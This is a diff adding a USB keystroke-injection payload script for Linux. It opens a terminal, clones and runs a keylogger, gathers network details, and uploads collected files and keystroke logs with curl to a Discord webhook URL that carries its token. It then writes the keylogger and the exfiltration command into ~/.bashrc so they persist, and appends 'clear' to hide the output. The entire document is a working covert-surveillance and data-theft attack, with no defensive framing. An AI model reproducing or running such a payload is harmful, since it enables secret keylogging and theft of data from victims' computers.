@@ -1,0 +1,59 @@
+REM Target: Linux
+ATTACKMODE HID STORAGE
+DELAY 500
+CTRL ALT t
+DELAY 1000
+STRING touch log.txt net.xml vuln.xml
+ENTER
+DELAY 1000
+STRING git clone https://github.com/dad1x/Keylogger.git & git clone https://github.com/dad1x/its_villain
+ENTER
+DELAY 1000
+STRING cd ~/Keylogger
+ENTER
+DELAY 1000
+STRING cd linux 
+ENTER
+STRING pip3 install -r requirements.txt
+ENTER
+DELAY 1000
+STRING chmod +x keylogger.py
+ENTER
+DELAY 1000
+STRING ./keylogger.py
+ENTER
+DELAY 1000
+STRING cd ~ 
+ENTER
+DELAY 1000
+STRING cd its_villain
+ENTER
+DELAY 1000
+STRING nohub ip a 
+ENTER
+DELAY 1000
+STRING nohup ifconfig  
+ENTER
+DELAY 1000
+STRING curl -F "filename=@/home/$USER/its_villain/nohup.out" "https://discord.com/api/webhooks/1182114686423007296/hwoTmjvNXp_dw58nOQDH8r_2ZTDUD2ZegapdTB95wBXQZNG8XvfTYihmVsROI8oVLLj6"  
+ENTER
+DELAY 1000
+STRING chmod +x no.sh
+ENTER
+DELAY 1000
+STRING nohup ./no.sh &
+ENTER
+DELAY 1000
+CTRL ALT t
+DELAY 1000
+STRING curl -F "filename=@/home/$USER/log.txt" "https://discord.com/api/webhooks/1182114686423007296/hwoTmjvNXp_dw58nOQDH8r_2ZTDUD2ZegapdTB95wBXQZNG8XvfTYihmVsROI8oVLLj6"
+ENTER
+DELAY 1000
+STRING echo "python3 /home/$USER/Keylogger/linux/keylogger.py &" >> ~/.bashrc
+ENTER
+DELAY 1000
+STRING echo "curl -F "filename=@/home/$USER/log.txt" "https://discord.com/api/webhooks/1182114686423007296/hwoTmjvNXp_dw58nOQDH8r_2ZTDUD2ZegapdTB95wBXQZNG8XvfTYihmVsROI8oVLLj6" >> ~/.bashrc
+ENTER
+DELAY 1000
+STRING echo "clear" >> ~/.bashrc
+ENTER
